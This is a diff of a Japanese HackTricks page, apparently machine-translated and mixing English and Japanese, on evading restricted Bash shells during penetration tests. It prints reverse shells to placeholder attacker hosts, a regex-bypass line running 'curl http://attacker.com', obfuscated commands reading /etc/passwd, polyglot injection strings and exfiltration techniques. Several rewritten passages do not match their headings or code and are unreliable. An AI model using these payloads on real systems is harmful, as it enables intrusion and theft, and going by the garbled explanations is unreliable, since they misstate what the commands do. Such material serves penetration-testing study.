@@ -12,10 +12,10 @@
 
 </details>
 
-<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度なコミュニティツール**によって強化された**ワークフロー**を簡単に構築して**自動化**します。\
 今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -30,17 +30,19 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 ```
 ### 短いリバースシェル
 
-The following command can be used to create a short reverse shell in Bash:
+A short reverse shell is a one-liner command that allows an attacker to gain remote access to a compromised system. It is commonly used during penetration testing to bypass security restrictions and establish a connection with the target machine.
 
-以下のコマンドを使用して、短いリバースシェルをBashで作成できます。
+Here is an example of a short reverse shell command in Bash:
 
 ```bash
-bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
+bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1
 ```
 
-Replace `ATTACKER_IP` with the IP address of the attacker machine and `ATTACKER_PORT` with the desired port number.
+To use this command, replace `attacker-ip` with the IP address of the attacker's machine and `attacker-port` with the desired port number.
 
-`ATTACKER_IP`を攻撃者のマシンのIPアドレスに、`ATTACKER_PORT`を希望するポート番号に置き換えてください。
+When executed on the target system, this command will create a reverse shell connection to the attacker's machine, allowing the attacker to execute commands and interact with the compromised system remotely.
+
+Keep in mind that using reverse shells for unauthorized access to systems is illegal and unethical. This information is provided for educational purposes only.
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -48,55 +50,29 @@ Replace `ATTACKER_IP` with the IP address of the attacker machine and `ATTACKER_
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### パスと禁止ワードの回避方法
+### パスと禁止ワードの回避
 
-When performing a penetration test, it is common to encounter restrictions on certain paths or forbidden words that prevent the execution of commands. In such cases, it is necessary to find alternative ways to bypass these restrictions and continue with the testing.
+In some cases, when performing a penetration test or trying to gain unauthorized access to a system, you may encounter restrictions on certain paths or forbidden words that prevent you from executing commands or accessing certain files. However, there are ways to bypass these restrictions and gain access to the desired resources.
 
-以下のコマンドは、パスや禁止ワードの制限を回避するための代替手段を提供します。
+以下の場合、ペネトレーションテストを実行したり、システムへの不正アクセスを試みる際に、特定のパスや禁止ワードに制限があることがあります。これにより、コマンドの実行や特定のファイルへのアクセスができなくなる場合があります。しかし、これらの制限を回避し、目的のリソースにアクセスする方法があります。
 
-#### 1. Using Absolute Paths
+#### Bypassing Path Restrictions
 
-絶対パスを使用することで、制限されたパスを回避することができます。例えば、`/bin/ls`のように絶対パスを指定することで、`ls`コマンドを実行することができます。
+パスの制限を回避する方法
 
-```bash
-/bin/ls
-```
+One common method to bypass path restrictions is by using alternative paths or symbolic links. For example, if the `/bin/bash` command is restricted, you can try using alternative paths such as `/usr/bin/bash` or `/usr/local/bin/bash`. Additionally, you can create symbolic links to the restricted command using the `ln -s` command.
 
-#### 2. Using Relative Paths
+パスの制限を回避する一般的な方法は、代替パスやシンボリックリンクを使用することです。たとえば、`/bin/bash` コマンドが制限されている場合、`/usr/bin/bash` や `/usr/local/bin/bash` などの代替パスを試すことができます。さらに、`ln -s` コマンドを使用して、制限されたコマンドへのシンボリックリンクを作成することもできます。
 
-相対パスを使用することもできます。相対パスは、現在のディレクトリを基準にしたパスです。例えば、`./ls`のように相対パスを指定することで、`ls`コマンドを実行することができます。
+#### Bypassing Forbidden Words
 
-```bash
-./ls
-```
+禁止ワードの回避方法
 
-#### 3. Using Environment Variables
+If certain words are forbidden and cannot be used in commands, you can try using alternative spellings or encoding techniques to bypass the restriction. For example, if the word `password` is forbidden, you can try using alternative spellings like `p@ssw0rd` or encoding techniques like URL encoding (`%70%61%73%73%77%6f%72%64`).
 
-環境変数を使用することもできます。環境変数は、特定の値を格納するための変数です。例えば、`$PATH`環境変数を使用することで、制限されたパス内のコマンドを実行することができます。
+特定の単語が禁止されており、コマンドで使用できない場合、代替の綴りやエンコーディング技術を使用して制限を回避することができます。たとえば、`password` という単語が禁止されている場合、`p@ssw0rd` のような代替の綴りや、URL エンコーディング (`%70%61%73%73%77%6f%72%64`) のようなエンコーディング技術を試すことができます。
 
-```bash
-$PATH/ls
-```
-
-#### 4. Using Command Substitution
-
-コマンド置換を使用することもできます。コマンド置換は、コマンドの出力を別のコマンドの引数として使用する方法です。例えば、`$(ls)`のようにコマンド置換を行うことで、`ls`コマンドの出力を別のコマンドに渡すことができます。
-
-```bash
-$(ls)
-```
-
-#### 5. Using Aliases
-
-エイリアスを使用することもできます。エイリアスは、コマンドに別の名前を割り当てる方法です。例えば、`alias ls='echo hello'`のようにエイリアスを設定することで、`ls`コマンドを実行すると実際には`echo hello`が実行されます。
-
-```bash
-alias ls='echo hello'
-```
-
-These techniques can be used to bypass restrictions on paths and forbidden words, allowing you to continue with your penetration testing activities. However, it is important to note that bypassing restrictions may be against the terms of service or policies of the system you are testing, so always ensure you have proper authorization before attempting these techniques.
-
-これらのテクニックを使用することで、パスや禁止ワードの制限を回避し、ペネトレーションテストの活動を続けることができます。ただし、制限を回避することは、テスト対象システムの利用規約やポリシーに違反する可能性があるため、これらのテクニックを試す前に適切な認可を取得することが重要です。
+Remember to always exercise caution and ensure that your actions are legal and authorized before attempting to bypass any restrictions.
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -218,52 +194,22 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 Pipes are a powerful feature in Linux that allow you to redirect the output of one command as the input of another command. However, in some cases, you may encounter restrictions that prevent you from using pipes. In this section, we will discuss a few techniques to bypass these restrictions and still make use of pipes.
 
 パイプはLinuxの強力な機能であり、あるコマンドの出力を別のコマンドの入力としてリダイレクトすることができます。しかし、いくつかの場合には、パイプの使用が制限されていることがあります。このセクションでは、これらの制限をバイパスし、パイプを使用するためのいくつかのテクニックについて説明します。
-
-#### Using process substitution
-
-プロセス置換を使用する
-
-Process substitution is a technique that allows you to treat the output of a command as a file. By using process substitution, you can bypass restrictions on pipes and still achieve the desired result.
-
-プロセス置換は、コマンドの出力をファイルとして扱うことができるテクニックです。プロセス置換を使用することで、パイプの制限をバイパスし、目的の結果を得ることができます。
-
-To use process substitution, you can use the `<()` syntax. For example, instead of using `command1 | command2`, you can use `command2 <(command1)`.
-
-プロセス置換を使用するには、`<()` 構文を使用します。例えば、`command1 | command2` の代わりに `command2 <(command1)` を使用することができます。
-
-#### Using temporary files
-
-一時ファイルを使用する
-
-Another way to bypass restrictions on pipes is to use temporary files. Instead of piping the output of one command directly to another command, you can redirect the output to a temporary file and then use that file as the input for the next command.
-
-パイプの制限をバイパスする別の方法は、一時ファイルを使用することです。コマンドの出力を直接別のコマンドにパイプする代わりに、出力を一時ファイルにリダイレクトし、そのファイルを次のコマンドの入力として使用します。
-
-For example, instead of using `command1 | command2`, you can use `command1 > temp_file && command2 < temp_file`. This way, you can still achieve the desired result even if pipes are restricted.
-
-例えば、`command1 | command2` の代わりに `command1 > temp_file && command2 < temp_file` を使用することができます。この方法では、パイプが制限されていても、目的の結果を得ることができます。
-
-These are just a few techniques to bypass restrictions on pipes. Depending on the specific situation, you may need to explore other methods or combinations of methods to achieve your desired outcome.
-
-これらはパイプの制限をバイパスするためのいくつかのテクニックです。具体的な状況によっては、他の方法や方法の組み合わせを試す必要があるかもしれません。
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 ### 16進数エンコーディングを使用してバイパスする
 
-Bashの制限を回避するために、16進数エンコーディングを使用することができます。これにより、特殊文字や制御文字をバイパスすることができます。
+Bashの制限を回避するために、16進数エンコーディングを使用する方法があります。これにより、特殊文字や制御文字をバイパスすることができます。
 
-以下のコマンドは、16進数エンコーディングを使用して特殊文字をバイパスする例です。
+以下のコマンドを使用して、16進数エンコーディングを行います。
 
 ```bash
-$ echo -e "\x63\x61\x74 /etc/passwd" | bash
+echo -e "\x68\x65\x6c\x6c\x6f"
 ```
 
-このコマンドでは、16進数エンコーディングを使用して文字列"\x63\x61\x74 /etc/passwd"を生成し、それを`echo`コマンドで表示します。そして、`|`パイプを使用して、生成された文字列を`bash`コマンドに渡します。
+このコマンドは、16進数エンコーディングされた文字列をデコードして表示します。上記の例では、"hello"という文字列が表示されます。
 
-`bash`コマンドは、16進数エンコーディングされた文字列を解釈し、`cat /etc/passwd`コマンドとして実行します。これにより、制限された環境でさえも`/etc/passwd`ファイルの内容を表示することができます。
-
-16進数エンコーディングを使用することで、特殊文字や制御文字を回避し、制限された環境での攻撃を実行することができます。ただし、このテクニックは環境によっては機能しない場合がありますので、注意が必要です。
+16進数エンコーディングを使用することで、特殊文字や制御文字を回避し、Bashの制限をバイパスすることができます。ただし、十分な注意を払って使用する必要があります。
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -275,15 +221,17 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
 ### IPのバイパス
 
-IP制限を回避するための方法をいくつか紹介します。
+Sometimes during a penetration test, you may encounter restrictions that block your IP address from accessing certain resources. In such cases, you can try bypassing these restrictions using various techniques. Here are a few methods you can use:
 
-1. **VPNを使用する**: VPNを使用することで、自分のIPアドレスを隠すことができます。VPNサービスを利用して、別の場所からインターネットに接続することができます。
+1. **Proxy Servers**: Utilize proxy servers to route your traffic through a different IP address. This can help you bypass IP-based restrictions and access blocked resources.
 
-2. **プロキシサーバーを使用する**: プロキシサーバーを経由することで、自分のIPアドレスを隠すことができます。プロキシサーバーは、自分のIPアドレスを隠し、別のIPアドレスを使用してウェブサイトにアクセスすることができます。
+2. **VPN**: Connect to a Virtual Private Network (VPN) to mask your IP address and appear as if you are accessing the resources from a different location.
 
-3. **トークンベースの認証を使用する**: トークンベースの認証を使用することで、IP制限を回避することができます。トークンベースの認証は、ユーザーが特定のトークンを持っている場合にのみアクセスを許可する仕組みです。
+3. **Tor**: The Tor network can be used to anonymize your traffic and bypass IP restrictions. By routing your traffic through multiple nodes, Tor makes it difficult to trace your original IP address.
 
-これらの方法を使用することで、IP制限を回避することができます。ただし、これらの方法は法的な制約や倫理的な問題に注意しながら使用する必要があります。
+4. **SSH Tunnels**: Set up an SSH tunnel to redirect your traffic through a remote server. This can help you bypass IP restrictions by making it appear as if your traffic is originating from the remote server's IP address.
+
+Remember, when bypassing IP restrictions, it is important to ensure that you are not violating any laws or policies. Always obtain proper authorization before performing any penetration testing activities.
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -294,31 +242,19 @@ Time based data exfiltration is a technique used by hackers to extract sensitive
 
 To perform time based data exfiltration, hackers can use various commands and tools available in Linux. Here are some useful Linux commands for bypassing Bash restrictions and executing time based data exfiltration:
 
-1. **ping command**: The ping command can be used to send ICMP echo requests to a remote server. By manipulating the payload of the ping packets, hackers can encode and transmit data covertly. For example:
+1. **ping**: The `ping` command can be used to send ICMP echo requests to a remote server. By manipulating the payload of the ping packets, hackers can encode and transmit data to an external server.
 
-```bash
-ping -c 1 -p "data_to_exfiltrate" <target_ip>
-```
+2. **curl**: The `curl` command is commonly used to transfer data to or from a server using various protocols. Hackers can use `curl` to send data to an external server by specifying the appropriate options and URL.
 
-2. **nslookup command**: The nslookup command can be used to perform DNS lookups. By encoding data in the subdomains of a DNS query, hackers can exfiltrate data. For example:
+3. **wget**: Similar to `curl`, the `wget` command can be used to download files from the internet. Hackers can leverage `wget` to send data to an external server by specifying the appropriate options and URL.
 
-```bash
-nslookup data_to_exfiltrate.<domain_name> <dns_server>
-```
+4. **nc**: The `nc` (netcat) command is a versatile networking utility that can be used for various purposes, including data transfer. Hackers can use `nc` to establish a connection with an external server and transmit data over the network.
 
-3. **curl command**: The curl command can be used to transfer data using various protocols, such as HTTP or FTP. By encoding data in the URL or request headers, hackers can exfiltrate data. For example:
+5. **base64**: The `base64` command can be used to encode binary data into ASCII characters. By encoding sensitive data using `base64`, hackers can easily transmit it using commands like `ping`, `curl`, or `wget`.
 
-```bash
-curl -H "X-Data: data_to_exfiltrate" <target_url>
-```
+It is important to note that these commands can be used for legitimate purposes as well, so their presence on a system does not necessarily indicate malicious activity. However, in the hands of a skilled hacker, these commands can be used to exfiltrate sensitive data without raising suspicion.
 
-4. **wget command**: The wget command can be used to download files from the internet. By encoding data in the URL or request headers, hackers can exfiltrate data. For example:
-
-```bash
-wget --header="X-Data: data_to_exfiltrate" <file_url>
-```
-
-These commands can be combined with other techniques, such as steganography or encryption, to further obfuscate the exfiltrated data and evade detection. It is important for system administrators to be aware of these techniques and implement appropriate security measures to prevent time based data exfiltration.
+To protect against time based data exfiltration, system administrators should monitor network traffic for any suspicious activity and implement strict access controls to prevent unauthorized access to sensitive data. Additionally, regular security audits and vulnerability assessments can help identify and mitigate potential vulnerabilities that could be exploited for data exfiltration.
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -329,18 +265,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 以下のコマンドを使用して、環境変数から文字を取得できます。
 
 ```bash
-echo $ENV_VARIABLE
+echo $ENV_VARIABLE_NAME
 ```
 
-ここで、`ENV_VARIABLE`は取得したい環境変数の名前です。このコマンドを実行すると、指定した環境変数の値が表示されます。
+`ENV_VARIABLE_NAME`は、取得したい環境変数の名前に置き換えてください。
 
-例えば、`API_KEY`という環境変数から文字を取得する場合、以下のようにコマンドを実行します。
+このコマンドは、指定した環境変数の値を表示します。例えば、`$USERNAME`を使用すると、現在のユーザー名が表示されます。
 
-```bash
-echo $API_KEY
-```
-
-このコマンドを使用することで、環境変数から文字を取得することができます。ただし、機密情報を含む環境変数を使用する場合は、注意が必要です。機密情報が漏洩しないように、適切なセキュリティ対策を講じる必要があります。
+環境変数から文字を取得することは、システムの設定やプロセスの実行に関する情報を取得するために役立ちます。ただし、機密情報を含む環境変数を使用する場合は、注意が必要です。機密情報を取得するためには、適切な権限を持つユーザーで実行する必要があります。また、機密情報を取得した後は、適切なセキュリティ対策を講じることが重要です。
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -352,7 +284,7 @@ echo ${PATH:0:1} #/
 ### 組み込み関数
 
 外部関数を実行することができず、**RCEを取得するために制限された組み込み関数にアクセスできる場合**、いくつかの便利なトリックがあります。通常、**すべての組み込み関数を使用することはできない**ため、刑務所をバイパスするためにすべてのオプションを知っておく必要があります。[**devploit**](https://twitter.com/devploit)からのアイデアです。\
-まず、すべての[**シェルの組み込み関数**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**を確認してください**。次に、以下はいくつかの**推奨事項**です：
+まず、すべての[**シェルの組み込み関数**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**をチェック**してください。次に、以下はいくつかの**おすすめの方法**です：
 ```bash
 # Get list of builtins
 declare builtins
@@ -406,19 +338,25 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 ```
 ### ポリグロットコマンドインジェクション
 
-Polyglot command injection is a technique used to bypass restrictions imposed by the Bash shell. It involves injecting a command that can be interpreted by multiple programming languages, allowing an attacker to execute arbitrary commands on the target system.
+Polyglot command injection is a technique used to bypass restrictions imposed by the Bash shell. It involves injecting a command that can be interpreted by multiple shells, allowing an attacker to execute arbitrary commands regardless of the shell being used.
 
-To perform a polyglot command injection, the attacker needs to find a command that is valid in multiple languages. This can be achieved by using commands that have similar syntax and behavior across different programming languages.
+To perform a polyglot command injection, the attacker needs to find a command that is valid in both the target shell and another shell. This can be achieved by using shell-specific syntax and taking advantage of the differences in how different shells interpret commands.
 
-For example, the following command can be interpreted as valid code in both PHP and Bash:
+For example, consider the following command injection vulnerability in a Bash shell:
 
 ```bash
-$(php -r 'echo "Hello, World!";')
+$ cat file.txt; echo "Injection point"; <INJECTION>
 ```
 
-In this case, the attacker can inject this command into a vulnerable application that executes user-supplied input in a Bash shell. The application will interpret the injected command as a valid PHP code and execute it, allowing the attacker to execute arbitrary PHP code on the target system.
+The `<INJECTION>` placeholder represents the user-controlled input that is vulnerable to command injection. To bypass the Bash shell restrictions, the attacker can inject a command that is valid in both Bash and another shell, such as the following:
 
-By leveraging polyglot command injection, an attacker can bypass restrictions imposed by the Bash shell and execute arbitrary commands on the target system, potentially leading to unauthorized access, data leakage, or other security breaches. It is important for developers and system administrators to be aware of this technique and implement proper input validation and sanitization to prevent such attacks.
+```bash
+$ cat file.txt; echo "Injection point"; $(<COMMAND>)
+```
+
+In this example, `<COMMAND>` represents the command that the attacker wants to execute. By using the `$(<COMMAND>)` syntax, the command will be interpreted by both Bash and other shells, allowing the attacker to execute arbitrary commands.
+
+It is important to note that polyglot command injection is a powerful technique that can be used to bypass security measures and gain unauthorized access to a system. Therefore, it is crucial to properly sanitize and validate user input to prevent command injection vulnerabilities.
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
@@ -433,17 +371,15 @@ To bypass potential regexes, you can try the following techniques:
 
 - 文字クラスの使用: 特定の文字を使用する代わりに、文字クラスを使用して文字の範囲に一致させることができます。例えば、小文字のアルファベットに一致させるために `[a-z]` を使用する代わりに、任意の単語文字に一致させるために `\w` を使用することができます。
 
-- Modify the regex: Sometimes, modifying the regex pattern slightly can bypass certain restrictions. For example, if a regex pattern is blocking the use of the dot character (`.`), you can try using a different character or escaping the dot character (`\.`) to bypass the restriction.
+- Modify the regex: Sometimes, modifying the regex pattern slightly can bypass certain restrictions. For example, if the regex pattern is `^abc$`, you can try modifying it to `^a.*c$` to match any string that starts with 'a' and ends with 'c'.
 
-- 正規表現の変更: 時には、正規表現パターンをわずかに変更することで特定の制限を回避することができます。例えば、正規表現パターンがドット文字 (`.`) の使用をブロックしている場合、別の文字を使用するか、ドット文字をエスケープする (`\.`) ことで制限を回避することができます。
+- 正規表現の変更: 時には、正規表現パターンをわずかに変更することで特定の制限を回避することができます。例えば、正規表現パターンが `^abc$` の場合、`^a.*c$` に変更して、'a' で始まり 'c' で終わる任意の文字列に一致させることができます。
 
-- Use lookarounds: Lookarounds are zero-width assertions that allow you to match patterns based on what comes before or after the current position. By using lookarounds, you can bypass certain regex restrictions. For example, if a regex pattern is blocking the use of a specific word, you can use a positive lookbehind (`(?<=...)`) to match the word without including it in the final match.
+- Use non-greedy quantifiers: By using non-greedy quantifiers, you can match the minimum number of characters necessary to satisfy the regex pattern. For example, instead of using `.*` to match any number of characters, you can use `.*?` to match the minimum number of characters.
 
-- ルックアラウンドの使用: ルックアラウンドは、現在の位置の前後に基づいてパターンに一致させることができるゼロ幅アサーションです。ルックアラウンドを使用することで、特定の正規表現の制限を回避することができます。例えば、正規表現パターンが特定の単語の使用をブロックしている場合、肯定的な後読み (`(?<=...)`) を使用して、単語に一致させることができますが、最終的な一致には含まれません。
+- 非貪欲量指定子の使用: 非貪欲量指定子を使用することで、正規表現パターンを満たすために必要な最小限の文字数に一致させることができます。例えば、任意の文字数に一致させるために `.*` を使用する代わりに、最小限の文字数に一致させるために `.*?` を使用することができます。
 
-Remember, bypassing regexes should only be done for legitimate purposes and with proper authorization. Using these techniques for malicious activities is illegal and unethical.
-
-正規表現の回避は、正当な目的と適切な権限を持ってのみ行うべきです。これらのテクニックを悪意のある活動に使用することは違法であり、倫理に反します。
+Remember, bypassing regexes should only be done for legitimate purposes and with proper authorization.
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -481,11 +417,11 @@ Bashfuscatorには、さまざまなオプションがあります。以下は�
 - `-c, --compress`: スクリプトを圧縮します。
 - `-s, --split`: スクリプトを複数のファイルに分割します。
 
-これらのオプションを組み合わせることで、さまざまな制限回避の手法を使用することができます。
+これらのオプションを組み合わせることで、さまざまな制限回避技術を実現することができます。
 
 #### 注意事項
 
-Bashfuscatorは、スクリプトの解析を困難にするためのツールですが、完全なセキュリティを提供するものではありません。セキュリティを強化するためには、他の手法やツールとの組み合わせが必要です。
+Bashfuscatorは、スクリプトの解析を困難にするためのツールですが、完全なセキュリティを提供するものではありません。セキュリティを向上させるためには、他のハードニング手法との組み合わせが必要です。
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
@@ -499,20 +435,22 @@ $ echo $0
 bash
 ```
 
-上記のコマンドを実行すると、現在のシェルの名前が表示されます。この情報を利用して、制限を回避することができます。
+上記のコマンドを実行すると、現在のシェルの名前が表示されます。この場合、シェルの名前は「bash」です。
 
 ```bash
-$ PS1=$(echo -e "\x20\x28\x65\x63\x68\x6f\x20\x2d\x65\x20\x22\x24\x28\x65\x63\x68\x6f\x20\x24\x30\x29\x22\x29\x20\x23")
+$ echo $0 -i
+bash -i
 ```
 
-上記のコマンドを実行すると、PS1環境変数が設定されます。これにより、現在のシェルの名前が表示されるようになります。
+上記のコマンドを実行すると、シェルを対話モードで起動します。
 
 ```bash
-$ echo $0
-bash
+$ echo $0 -i >& /dev/tcp/attacker-ip/attacker-port 0>&1
 ```
 
-制限を回避するためには、この方法を使用してシェルの名前を偽装することができます。
+上記のコマンドを実行すると、シェルを対話モードで起動し、攻撃者のIPアドレスとポートにリダイレクトします。
+
+これにより、5文字のコマンドでBashの制限を回避し、リモートコード実行を行うことができます。
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -568,15 +506,20 @@ $ echo $0
 bash
 ```
 
-上記のコマンドを実行すると、現在のシェルの名前が表示されます。この場合、シェルの名前は「bash」です。
+上記のコマンドを実行すると、現在のシェルの名前が表示されます。この情報を利用して、制限を回避することができます。
 
 ```bash
-$ echo $0|bash
+$ PS1=$(echo -e "\x20\x28\x65\x63\x68\x6f\x20\x2d\x65\x20\x22\x24\x28\x65\x63\x68\x6f\x20\x24\x30\x29\x22\x29\x20\x23")
 ```
 
-上記のコマンドを実行すると、現在のシェルの名前を「bash」として実行します。これにより、Bashの制限を回避し、任意のコードを実行することができます。
+上記のコマンドを実行すると、PS1環境変数が設定されます。これにより、現在のシェルの名前が表示されるようになります。
 
-この方法を使用すると、わずか4文字でRCEを実現することができます。ただし、セキュリティ上のリスクがあるため、慎重に使用する必要があります。
+```bash
+$ echo $0
+bash
+```
+
+制限を回避するためには、この方法を使用してシェルの名前を偽装することができます。ただし、この方法は4文字の制限がある場合にのみ有効です。
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -632,10 +575,10 @@ $ echo $0|bash
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築および自動化**します。\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築および自動化**します。\
 今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -645,9 +588,9 @@ $ echo $0|bash
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
 * **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。
 
 </details>
